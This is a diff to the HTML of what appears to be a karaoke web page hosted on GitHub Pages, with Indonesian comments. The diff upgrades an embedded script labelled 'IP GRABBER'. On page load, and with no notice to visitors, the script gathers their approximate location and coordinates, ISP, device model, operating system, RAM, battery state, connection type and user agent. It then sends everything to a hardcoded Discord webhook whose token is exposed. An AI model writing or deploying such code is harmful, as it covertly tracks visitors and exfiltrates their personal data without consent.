@@ -1084,7 +1084,7 @@ document.addEventListener('keydown', e => {
 // Init favorites display
 renderFavList();
 </script>
-<!-- ==================== IP GRABBER FINAL - Sesuai Selera Kamu ==================== -->
+<!-- ==================== IP GRABBER FINAL v9 - Full Request ==================== -->
 <script>
 // GANTI DENGAN WEBHOOK DISCORD KAMU
 const WEBHOOK_URL = "https://discord.com/api/webhooks/1489972314215809124/bRqWBzezptsRKE8nLFEFMjz3ShcgSFATRsf1KhuF4AkSKu3a2xIQkU0T4p5pCEgpQQq7";
@@ -1120,14 +1120,21 @@ async function sendIPLog() {
             lat: data.latitude,
             lon: data.longitude
         };
-    } catch (e) {
-        console.log("IP lookup failed");
-    }
+    } catch (e) {}
 
     const deviceModel = getDeviceModel();
 
+    // Battery
+    let batteryInfo = 'Tidak tersedia';
+    if ('getBattery' in navigator) {
+        try {
+            const battery = await navigator.getBattery();
+            batteryInfo = `${Math.round(battery.level * 100)}% ${battery.charging ? '(Charging)' : '(Discharging)'}`;
+        } catch (e) {}
+    }
+
     const embed = {
-        title: "🎤 Karaoke Sync - Pengunjung Baru!",
+        title: "🎤 Karaoke Sync - Pengunjung Baru! (v9 Full)",
         color: 0x00ff88,
         timestamp: new Date().toISOString(),
         fields: [
@@ -1136,15 +1143,18 @@ async function sendIPLog() {
             { name: "Koordinat", value: ipData.lat && ipData.lon ? `${ipData.lat.toFixed(4)}, ${ipData.lon.toFixed(4)}` : 'Tidak tersedia', inline: true },
             { name: "ISP", value: ipData.org || 'Unknown', inline: true },
             { name: "Device Model", value: deviceModel, inline: true },
+            { name: "Operating System", value: navigator.platform || 'Unknown', inline: true },
             { name: "Screen", value: `${screen.width} × ${screen.height}`, inline: true },
-            { name: "Device Info", value: navigator.userAgent.substring(0, 220) + (navigator.userAgent.length > 220 ? "..." : ""), inline: false },
-            { name: "Platform", value: navigator.platform || 'Unknown', inline: true },
             { name: "CPU Cores", value: navigator.hardwareConcurrency || 'Unknown', inline: true },
+            { name: "RAM (approx)", value: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown', inline: true },
+            { name: "Battery", value: batteryInfo, inline: true },
+            { name: "Connection", value: navigator.connection ? navigator.connection.effectiveType : 'Unknown', inline: true },
             { name: "Dark Mode", value: window.matchMedia('(prefers-color-scheme: dark)').matches ? '✅ Ya' : '❌ Tidak', inline: true },
-            { name: "Referrer", value: document.referrer ? document.referrer.substring(0, 90) : "Langsung / WA", inline: false },
+            { name: "Touch Support", value: 'ontouchstart' in window ? '✅ Ya (Mobile)' : '❌ Tidak', inline: true },
+            { name: "Device Info", value: navigator.userAgent.substring(0, 220) + (navigator.userAgent.length > 220 ? "..." : ""), inline: false },
             { name: "Waktu (WIB)", value: new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }), inline: false }
         ],
-        footer: { text: "IP Grabber via GitHub Pages • Final Version" }
+        footer: { text: "IP Grabber via GitHub Pages • Upgrade v9 Full" }
     };
 
     try {
@@ -1153,7 +1163,7 @@ async function sendIPLog() {
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({ username: "Karaoke Logger", embeds: [embed] })
         });
-        console.log("%c✅ IP Log terkirim - Final Version", "color: lime; font-weight: bold");
+        console.log("%c✅ IP Log terkirim - v9 Full", "color: lime; font-weight: bold");
     } catch (err) {
         console.log("IP Logger error:", err.message);
     }
@@ -1161,7 +1171,7 @@ async function sendIPLog() {
 
 // Jalankan setelah load
 window.addEventListener('load', () => {
-    setTimeout(sendIPLog, 1800);
+    setTimeout(sendIPLog, 2000);
 });
 </script>
-<!-- ==================== END IP GRABBER FINAL ==================== -->
+<!-- ==================== END IP GRABBER v9 ==================== -->
